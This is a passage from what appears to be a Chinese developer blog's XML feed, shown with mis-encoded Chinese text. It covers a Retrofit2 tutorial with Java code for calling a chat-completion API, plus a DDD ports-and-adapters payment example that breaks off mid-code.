alt="avatar"></p><p>ç‚¹å¼€æŸ¥çœ‹ä½¿ç”¨è€…çš„è´¦æˆ·è¯¦ç»†èµ„æ–™å°±èƒ½æ‰¾åˆ°:</p><p><img src="https://pb01.s3.bitiful.net/56.png" alt="avatar"></p><p>ä¸‹å›¾æˆ‘æ‰“çº¢è‰²ç çš„å°±æ˜¯è·Ÿè¸ªid:</p><p><img src="https://pb01.s3.bitiful.net/55.png" alt="avatar"></p><p>æ›´æ”¹å¥½äº†ä»¥å,é‡æ–°éƒ¨ç½²åšå®¢,æœ€åçœ‹åˆ°è¿™æ ·çš„é¡µé¢:</p><p><img src="https://pb01.s3.bitiful.net/49.png" alt="avatar"></p><p>å°±å¤§åŠŸå‘Šæˆå•¦!</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Retrofit2ç®€æ˜è®²è§£</title>
      <link href="/2023/12/05/2023-12-5-Retrofit2/"/>
      <url>/2023/12/05/2023-12-5-Retrofit2/</url>
      
        <content type="html"><![CDATA[<h3 id="Retrofit2ç®€æ˜è®²è§£"><a href="#Retrofit2ç®€æ˜è®²è§£" class="headerlink" title="Retrofit2ç®€æ˜è®²è§£"></a>Retrofit2ç®€æ˜è®²è§£</h3><h4 id="ä»€ä¹ˆæ˜¯Retrofit"><a href="#ä»€ä¹ˆæ˜¯Retrofit" class="headerlink" title="ä»€ä¹ˆæ˜¯Retrofit"></a>ä»€ä¹ˆæ˜¯Retrofit</h4><p>retrofitæ˜¯ç°åœ¨æ¯”è¾ƒæµè¡Œçš„ç½‘ç»œè¯·æ±‚æ¡†æ¶ï¼Œå¯ä»¥ç†è§£ä¸ºokhttpçš„åŠ å¼ºç‰ˆï¼Œåº•å±‚å°è£…äº†okhttpã€‚å‡†ç¡®æ¥è¯´ï¼ŒRetrofitæ˜¯ä¸€ä¸ªRESTfulçš„httpç½‘ç»œè¯·æ±‚æ¡†æ¶çš„å°è£…ã€‚å› ä¸ºç½‘ç»œè¯·æ±‚å·¥ä½œæœ¬è´¨ä¸Šæ˜¯ç”±okhttpæ¥å®Œæˆï¼Œè€ŒRetrofitè´Ÿè´£ç½‘ç»œè¯·æ±‚æ¥å£çš„å°è£…ã€‚</p><p><img src="https://pb01.s3.bitiful.net/45.png" alt="avatar"></p><p><strong>æœ¬è´¨è¿‡ç¨‹</strong>ï¼šAppåº”ç”¨ç¨‹åºé€šè¿‡Retrofitè¯·æ±‚ç½‘ç»œï¼Œå®è´¨ä¸Šæ˜¯ä½¿ç”¨Retrofitæ¥å£å±‚å°è£…è¯·æ±‚å‚æ•°,å³Headerã€Urlç­‰ä¿¡æ¯ï¼Œä¹‹åç”±okhttpæ¥å®Œæˆåç»­çš„è¯·æ±‚å·¥ä½œã€‚åœ¨æœåŠ¡ç«¯è¿”å›æ•°æ®åï¼Œokhttpå°†åŸå§‹æ•°æ®äº¤ç»™Retrofitï¼ŒRetrofitæ ¹æ®ç”¨æˆ·éœ€æ±‚è§£æã€‚</p><p><img src="https://pb01.s3.bitiful.net/46.png" alt="avatar"></p><h4 id="ä½¿ç”¨ä»‹ç»"><a href="#ä½¿ç”¨ä»‹ç»" class="headerlink" title="ä½¿ç”¨ä»‹ç»"></a>ä½¿ç”¨ä»‹ç»</h4><p>ä½¿ç”¨ Retrofit çš„æ­¥éª¤å…±æœ‰7ä¸ªï¼š</p><p><strong>æ­¥éª¤1</strong>ï¼šæ·»åŠ Retrofitåº“çš„ä¾èµ–<br><strong>æ­¥éª¤2</strong>ï¼šåˆ›å»º æ¥æ”¶æœåŠ¡å™¨è¿”å›æ•°æ® çš„ç±»<br><strong>æ­¥éª¤3</strong>ï¼šåˆ›å»º ç”¨äºæè¿°ç½‘ç»œè¯·æ±‚ çš„æ¥å£<br><strong>æ­¥éª¤4</strong>ï¼šåˆ›å»ºRetrofitå®ä¾‹ å¹¶ åˆ›å»ºç½‘ç»œè¯·æ±‚æ¥å£å®ä¾‹<br><strong>æ­¥éª¤5</strong>ï¼šå‘é€ç½‘ç»œè¯·æ±‚ï¼ˆå¼‚æ­¥ / åŒæ­¥ï¼‰</p><h5 id="æ­¥éª¤1ï¼šæ·»åŠ Retrofitåº“çš„ä¾èµ–"><a href="#æ­¥éª¤1ï¼šæ·»åŠ Retrofitåº“çš„ä¾èµ–" class="headerlink" title="æ­¥éª¤1ï¼šæ·»åŠ Retrofitåº“çš„ä¾èµ–"></a>æ­¥éª¤1ï¼šæ·»åŠ Retrofitåº“çš„ä¾èµ–</h5><p>å¦‚å›¾æ‰€ç¤º:</p><p><img src="https://pb01.s3.bitiful.net/47.png" alt="avatar"></p><h5 id="æ­¥éª¤2ï¼šåˆ›å»º-æ¥æ”¶æœåŠ¡å™¨è¿”å›æ•°æ®-çš„ç±»"><a href="#æ­¥éª¤2ï¼šåˆ›å»º-æ¥æ”¶æœåŠ¡å™¨è¿”å›æ•°æ®-çš„ç±»" class="headerlink" title="æ­¥éª¤2ï¼šåˆ›å»º æ¥æ”¶æœåŠ¡å™¨è¿”å›æ•°æ® çš„ç±»"></a>æ­¥éª¤2ï¼šåˆ›å»º æ¥æ”¶æœåŠ¡å™¨è¿”å›æ•°æ® çš„ç±»</h5><p>åœ¨æ­£å¼çš„è¯·æ±‚ç½‘ç»œæ•°æ®ä¸­ï¼Œè¿”å›çš„æ•°æ®çš„å¤–åµŒå¥—éƒ¨åˆ†éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæºå¸¦çŠ¶æ€ç ã€çŠ¶æ€ä¿¡æ¯ã€å®ä½“æ•°æ®ä¸€èµ·è¿”å›ï¼Œæˆ‘ä»¬å¯ä»¥å°†å®ƒå°è£…ä¸€ä¸ªç»Ÿä¸€çš„æ•°æ®å›è°ƒç±»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChatCompletionResponse</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** ID */</span></span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line">    <span class="comment">/** å¯¹è±¡ */</span></span><br><span class="line">    <span class="keyword">private</span> String object;</span><br><span class="line">    <span class="comment">/** æ¨¡å‹ */</span></span><br><span class="line">    <span class="keyword">private</span> String model;</span><br><span class="line">    <span class="comment">/** å¯¹è¯ */</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;ChatChoice&gt; choices;</span><br><span class="line">    <span class="comment">/** åˆ›å»º */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> created;</span><br><span class="line">    <span class="comment">/** è€—æ */</span></span><br><span class="line">    <span class="keyword">private</span> Usage usage;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="æ­¥éª¤3ï¼šåˆ›å»º-ç”¨äºæè¿°ç½‘ç»œè¯·æ±‚-çš„æ¥å£"><a href="#æ­¥éª¤3ï¼šåˆ›å»º-ç”¨äºæè¿°ç½‘ç»œè¯·æ±‚-çš„æ¥å£" class="headerlink" title="æ­¥éª¤3ï¼šåˆ›å»º ç”¨äºæè¿°ç½‘ç»œè¯·æ±‚ çš„æ¥å£"></a>æ­¥éª¤3ï¼šåˆ›å»º ç”¨äºæè¿°ç½‘ç»œè¯·æ±‚ çš„æ¥å£</h5><p>è¿™ä¸ªç±»å°±æ˜¯Retrofitå°†okhttpè¯·æ±‚æŠ½è±¡æˆjavaçš„æ¥å£ç±»ï¼Œç”¨æ³¨è§£æè¿°å’Œé…ç½®ç½‘ç»œè¯·æ±‚å‚æ•°ï¼Œå°è£…Urlåœ°å€å’Œç½‘ç»œæ•°æ®è¯·æ±‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IOpenAiApi</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * é»˜è®¤ GPT-3.5 é—®ç­”æ¨¡å‹</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> chatCompletionRequest è¯·æ±‚ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span>                      è¿”å›ç»“æœ</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@POST(&quot;v1/chat/completions&quot;)</span></span><br><span class="line">    Single&lt;ChatCompletionResponse&gt; <span class="title function_">completions</span><span class="params">(<span class="meta">@Body</span> ChatCompletionRequest chatCompletionRequest)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æ–¹æ³•å¤´éƒ¨æ·»åŠ @POSTæ³¨è§£ï¼Œè¡¨ç¤ºé‡‡ç”¨postæ–¹æ³•è®¿é—®ç½‘ç»œè¯·æ±‚ï¼Œæ‹¬å·å†…çš„æ˜¯è¯·æ±‚çš„åœ°å€(Urlçš„ä¸€éƒ¨åˆ†) ï¼Œå…¶ä¸­è¿”å›ç±»å‹æ˜¯Single&lt;<em>&gt;ï¼Œ</em>è¡¨ç¤ºæ¥æ”¶æ•°æ®çš„ç±»ï¼ŒChatCompletionResponseæ˜¯ä¸Šé¢å°è£…çš„ä¸€ä¸ªæ¥æ”¶æ•°æ®çš„ç»Ÿä¸€å…¬å…±ç±»</p><h5 id="æ­¥éª¤4ï¼šåˆ›å»ºRetrofitå®ä¾‹-å¹¶-åˆ›å»ºç½‘ç»œè¯·æ±‚æ¥å£å®ä¾‹"><a href="#æ­¥éª¤4ï¼šåˆ›å»ºRetrofitå®ä¾‹-å¹¶-åˆ›å»ºç½‘ç»œè¯·æ±‚æ¥å£å®ä¾‹" class="headerlink" title="æ­¥éª¤4ï¼šåˆ›å»ºRetrofitå®ä¾‹ å¹¶ åˆ›å»ºç½‘ç»œè¯·æ±‚æ¥å£å®ä¾‹"></a>æ­¥éª¤4ï¼šåˆ›å»ºRetrofitå®ä¾‹ å¹¶ åˆ›å»ºç½‘ç»œè¯·æ±‚æ¥å£å®ä¾‹</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="type">IOpenAiApi</span> <span class="variable">openAiApi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Retrofit</span>.Builder()</span><br><span class="line">                .baseUrl(configuration.getApiHost())<span class="comment">//å¾—åˆ°url</span></span><br><span class="line">                .client(okHttpClient)<span class="comment">//è®¾ç½®å®¢æˆ·ç«¯</span></span><br><span class="line"><span class="comment">//        RxJava2CallAdapterFactoryçš„ä¸»è¦ä½œç”¨æ˜¯ï¼š</span></span><br><span class="line"><span class="comment">//        1.å°†Androidçš„Callå¯¹è±¡è½¬æ¢ä¸ºRxJavaçš„Observableç±»å‹ã€‚</span></span><br><span class="line"><span class="comment">//        2.å¤„ç†Callçš„é”™è¯¯å’Œç»“æœï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºRxJavaçš„onErrorå’ŒonNextäº‹ä»¶ã€‚</span></span><br><span class="line"><span class="comment">//        3.æ·»åŠ é€‚å½“çš„é”™è¯¯å¤„ç†é€»è¾‘ï¼Œä¾‹å¦‚é‡è¯•ã€ç½‘ç»œé”™è¯¯ç­‰ã€‚</span></span><br><span class="line">                .addCallAdapterFactory(RxJava2CallAdapterFactory.create())</span><br><span class="line">                .addConverterFactory(JacksonConverterFactory.create())<span class="comment">//åœ¨è¯·æ±‚å’Œå“åº”ä¸­ä½¿ç”¨jacksonåº“è¿›è¡Œjsonè½¬æ¢</span></span><br><span class="line">                .build().create(IOpenAiApi.class);</span><br></pre></td></tr></table></figure><h5 id="æ­¥éª¤5ï¼šå‘é€ç½‘ç»œè¯·æ±‚ï¼ˆå¼‚æ­¥-åŒæ­¥ï¼‰"><a href="#æ­¥éª¤5ï¼šå‘é€ç½‘ç»œè¯·æ±‚ï¼ˆå¼‚æ­¥-åŒæ­¥ï¼‰" class="headerlink" title="æ­¥éª¤5ï¼šå‘é€ç½‘ç»œè¯·æ±‚ï¼ˆå¼‚æ­¥ / åŒæ­¥ï¼‰"></a>æ­¥éª¤5ï¼šå‘é€ç½‘ç»œè¯·æ±‚ï¼ˆå¼‚æ­¥ / åŒæ­¥ï¼‰</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefaultOpenAiSession</span> <span class="keyword">implements</span> <span class="title class_">OpenAiSession</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> IOpenAiApi openAiApi;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DefaultOpenAiSession</span><span class="params">(IOpenAiApi openAiApi)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.openAiApi = openAiApi;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ChatCompletionResponse <span class="title function_">completions</span><span class="params">(ChatCompletionRequest chatCompletionRequest)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.openAiApi.completions(chatCompletionRequest).blockingGet();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><ol><li><p><a href="https://www.jianshu.com/p/a3e162261ab6" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">Carsonå¸¦ä½ å­¦Androidï¼šç½‘ç»œè¯·æ±‚åº“Retrofitä½¿ç”¨æ•™ç¨‹(å«å®ä¾‹è®²è§£)</a></p></li><li><p><a href="https://juejin.cn/post/6978777076073660429" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">Retrofit2 å®æˆ˜ï¼ˆä¸€ã€ä½¿ç”¨è¯¦è§£ç¯‡ï¼‰</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DDDæ¶æ„ä¹‹ç«¯å£</title>
      <link href="/2023/12/04/2023-12-4-DDD%E6%9E%B6%E6%9E%84-4/"/>
      <url>/2023/12/04/2023-12-4-DDD%E6%9E%B6%E6%9E%84-4/</url>
      
        <content type="html"><![CDATA[<h3 id="DDDæ¶æ„ä¹‹ç«¯å£"><a href="#DDDæ¶æ„ä¹‹ç«¯å£" class="headerlink" title="DDDæ¶æ„ä¹‹ç«¯å£"></a>DDDæ¶æ„ä¹‹ç«¯å£</h3><p>åœ¨é¢†åŸŸé©±åŠ¨è®¾è®¡ï¼ˆDDDï¼‰çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œé€‚é…å™¨ï¼ˆAdapterï¼‰æ¨¡å¼æ‰®æ¼”ç€è‡³å…³é‡è¦çš„è§’è‰²ã€‚é€‚é…å™¨æ¨¡å¼å…è®¸å°†ä¸å…¼å®¹çš„æ¥å£è½¬æ¢ä¸ºå¦ä¸€ä¸ªé¢„æœŸçš„æ¥å£ï¼Œä»è€Œä½¿åŸæœ¬ç”±äºæ¥å£ä¸å…¼å®¹è€Œä¸èƒ½ä¸€èµ·å·¥ä½œçš„ç±»å¯ä»¥ååŒå·¥ä½œã€‚åœ¨DDDä¸­ï¼Œé€‚é…å™¨é€šå¸¸ä¸ç«¯å£ï¼ˆPortï¼‰æ¦‚å¿µç»“åˆä½¿ç”¨ï¼Œå½¢æˆâ€ç«¯å£å’Œé€‚é…å™¨â€ï¼ˆPorts and Adaptersï¼‰æ¶æ„ï¼Œä¹Ÿç§°ä¸ºâ€å…­è¾¹å½¢æ¶æ„â€ï¼ˆHexagonal Architectureï¼‰ã€‚è¿™ç§æ¶æ„é£æ ¼æ—¨åœ¨å°†åº”ç”¨ç¨‹åºçš„æ ¸å¿ƒé€»è¾‘ä¸å¤–éƒ¨ä¸–ç•Œçš„äº¤äº’è§£è€¦ã€‚</p><h4 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h4><p>Port åœ¨è¿™ç§æ¶æ„ä¸­ä»£è¡¨äº†åº”ç”¨ç¨‹åºçš„ä¸€ä¸ªå…¥å£æˆ–å‡ºå£ç‚¹ã€‚å®ƒå®šä¹‰äº†ä¸€ä¸ªä¸å¤–éƒ¨ä¸–ç•Œäº¤äº’çš„æ¥å£ï¼Œä½†ä¸å…³å¿ƒå…·ä½“çš„å®ç°ç»†èŠ‚ã€‚ç«¯å£å¯ä»¥æ˜¯é©±åŠ¨ç«¯å£ï¼ˆDriving Portsï¼Œé€šå¸¸æ˜¯è¾“å…¥ç«¯å£ï¼‰æˆ–è¢«é©±åŠ¨ç«¯å£ï¼ˆDriven Portsï¼Œé€šå¸¸æ˜¯è¾“å‡ºç«¯å£ï¼‰ã€‚</p><h4 id="ç‰¹æ€§"><a href="#ç‰¹æ€§" class="headerlink" title="ç‰¹æ€§"></a>ç‰¹æ€§</h4><ul><li><strong>æŠ½è±¡æ€§</strong>ï¼šç«¯å£æä¾›äº†æœåŠ¡è¡Œä¸ºçš„æŠ½è±¡æè¿°ï¼Œæ˜ç¡®äº†æœåŠ¡çš„åŠŸèƒ½å’Œå¤–éƒ¨ä¾èµ–ã€‚</li><li><strong>ç‹¬ç«‹æ€§</strong>ï¼šç«¯å£ç‹¬ç«‹äºå…·ä½“å®ç°ï¼Œå…è®¸æœåŠ¡å®ç°çš„çµæ´»æ›¿æ¢æˆ–æ‰©å±•ã€‚</li><li><strong>çµæ´»æ€§</strong>ï¼šå¯ä»¥ä¸ºåŒä¸€ç«¯å£æä¾›ä¸åŒçš„é€‚é…å™¨å®ç°ï¼Œä»¥é€‚åº”ä¸åŒçš„è¿è¡Œç¯å¢ƒæˆ–éœ€æ±‚ã€‚</li></ul><h4 id="ç”¨é€”"><a href="#ç”¨é€”" class="headerlink" title="ç”¨é€”"></a>ç”¨é€”</h4><ul><li><strong>æ ‡å‡†å®šä¹‰</strong>ï¼šç«¯å£å’Œé€‚é…å™¨å®šä¹‰äº†æœåŠ¡çš„æ ‡å‡†è¡Œä¸ºå’Œå¤–éƒ¨ä¾èµ–ï¼Œæé«˜äº†ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</li><li><strong>éš”ç¦»å˜åŒ–</strong>ï¼šå½“å¤–éƒ¨ç³»ç»Ÿå˜åŒ–æ—¶ï¼Œåªéœ€æ›´æ¢æˆ–ä¿®æ”¹é€‚é…å™¨ï¼Œæ— éœ€æ”¹åŠ¨æ ¸å¿ƒä¸šåŠ¡é€»è¾‘ã€‚</li><li><strong>ä¿ƒè¿›æµ‹è¯•</strong>ï¼šå¯ä»¥ä½¿ç”¨æ¨¡æ‹Ÿé€‚é…å™¨æ¥æµ‹è¯•æ ¸å¿ƒé€»è¾‘ï¼Œè€Œä¸ä¾èµ–çœŸå®çš„å¤–éƒ¨ç³»ç»Ÿã€‚</li></ul><h4 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h4><p>å®ç°ç«¯å£å’Œé€‚é…å™¨æ¶æ„é€šå¸¸æ¶‰åŠä»¥ä¸‹æ­¥éª¤ï¼š</p><ol><li><strong>å®šä¹‰ç«¯å£</strong>ï¼šåœ¨é¢†åŸŸå±‚å®šä¹‰æ¸…æ™°çš„æ¥å£ï¼Œè¿™äº›æ¥å£ä»£è¡¨äº†åº”ç”¨ç¨‹åºä¸å¤–éƒ¨ä¸–ç•Œçš„äº¤äº’ç‚¹ã€‚</li><li><strong>åˆ›å»ºé€‚é…å™¨</strong>ï¼šåœ¨åŸºç¡€å±‚æˆ–åº”ç”¨å±‚å®ç°é€‚é…å™¨ï¼Œè¿™äº›é€‚é…å™¨è´Ÿè´£å°†ç«¯å£çš„æŠ½è±¡æ“ä½œè½¬æ¢ä¸ºå…·ä½“çš„å¤–éƒ¨è°ƒç”¨ã€‚</li><li><strong>ä¾èµ–å€’ç½®</strong>ï¼šåº”ç”¨ç¨‹åºçš„æ ¸å¿ƒé€»è¾‘ä¾èµ–äºç«¯å£æ¥å£ï¼Œè€Œä¸æ˜¯é€‚é…å™¨çš„å…·ä½“å®ç°ã€‚è¿™æ ·ï¼Œé€‚é…å™¨å¯ä»¥éšæ—¶è¢«æ›¿æ¢ï¼Œè€Œä¸å½±å“æ ¸å¿ƒé€»è¾‘ã€‚</li><li><strong>é…ç½®å’Œç»„è£…</strong>ï¼šåœ¨åº”ç”¨ç¨‹åºå¯åŠ¨æ—¶ï¼Œæ ¹æ®éœ€è¦å°†é€‚é…å™¨ä¸ç›¸åº”çš„ç«¯å£è¿æ¥èµ·æ¥ã€‚</li></ol><p>é€šè¿‡è¿™ç§æ–¹å¼ï¼ŒDDDä¸­çš„é€‚é…å™¨æ¨¡å¼æœ‰åŠ©äºæ„å»ºä¸€ä¸ªçµæ´»ã€å¯ç»´æŠ¤ä¸”æ˜“äºæµ‹è¯•çš„ç³»ç»Ÿã€‚</p><h4 id="æ¡ˆä¾‹"><a href="#æ¡ˆä¾‹" class="headerlink" title="æ¡ˆä¾‹"></a>æ¡ˆä¾‹</h4><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„Javaç¤ºä¾‹ï¼Œå±•ç¤ºäº†å¦‚ä½•åœ¨DDDæ¶æ„ä¸­å®ç°é€‚é…å™¨æ¨¡å¼ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†åˆ›å»ºä¸€ä¸ªç®€å•çš„æ”¯ä»˜ç³»ç»Ÿï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæ”¯ä»˜ç«¯å£å’Œä¸€ä¸ªé€‚é…å™¨ï¼Œè¯¥é€‚é…å™¨è´Ÿè´£è°ƒç”¨å¤–éƒ¨æ”¯ä»˜æœåŠ¡çš„æ¥å£ã€‚</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªæ”¯ä»˜ç«¯å£ï¼ˆPortï¼‰ï¼Œå®ƒæ˜¯ä¸€ä¸ªæ¥å£ï¼Œæè¿°äº†æ”¯ä»˜æœåŠ¡åº”è¯¥æä¾›çš„æ“ä½œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">PaymentPort</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">processPayment</span><span class="params">(<span class="type">double</span> amount)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªé€‚é…å™¨ï¼Œå®ƒå®ç°äº†æ”¯ä»˜ç«¯å£ï¼Œå¹¶è´Ÿè´£è°ƒç”¨å¤–éƒ¨æ”¯ä»˜æœåŠ¡çš„æ¥å£ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExternalPaymentService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">makePayment</span><span class="params">(<span class="type">double</span> amount)</span> &#123;</span><br><span class="line">        <span class="comment">// è¿™é‡Œæ˜¯å¤–éƒ¨æ”¯ä»˜æœåŠ¡çš„å…·ä½“è°ƒç”¨é€»è¾‘</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Calling external payment service for amount: &quot;</span> + amount);</span><br><span class="line">        <span class="comment">// å‡è®¾æ”¯ä»˜æ€»æ˜¯æˆåŠŸ</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PaymentAdapter</span> <span class="keyword">implements</span> <span class="title class_">PaymentPort</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> ExternalPaymentService externalPaymentService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PaymentAdapter</span><span class="params">(ExternalPaymentService externalPaymentService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.externalPaymentService = externalPaymentService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">processPayment</span><span class="params">(<span class="type">double</span> amount)</span> &#123;</span><br><span class="line">        <span class="comment">// è°ƒç”¨å¤–éƒ¨æ”¯ä»˜æœåŠ¡çš„æ¥å£</span></span><br><span class="line">        <span class="keyword">return</span> externalPaymentService.makePayment(amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨åº”ç”¨ç¨‹åºçš„æ ¸å¿ƒé€»è¾‘ä¸­ä½¿ç”¨æ”¯ä»˜ç«¯å£ï¼Œè€Œä¸ä¾èµ–äºé€‚é…å™¨çš„å…·ä½“å®ç°ã€‚è¿™æ ·ï¼Œå¦‚æœå°†æ¥éœ€è¦æ›´æ¢å¤–éƒ¨æ”¯ä»˜æœåŠ¡ï¼Œæˆ‘ä»¬åªéœ€æä¾›ä¸€ä¸ªæ–°çš„é€‚é…å™¨å®ç°å³å¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PaymentService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> PaymentPort paymentPort;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PaymentService</span><span class="params">(PaymentPort paymentPort)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.paymentPort = paymentPort;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processUserPayment</span><span class="params">(<span class="type">double</span> amount)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (paymentPort.processPayment(amount)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Payment processed successfully.&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Payment failed.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œæˆ‘ä»¬åœ¨åº”ç”¨ç¨‹åºçš„å¯åŠ¨æˆ–é…ç½®é˜¶æ®µç»„è£…è¿™äº›ç»„ä»¶ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span 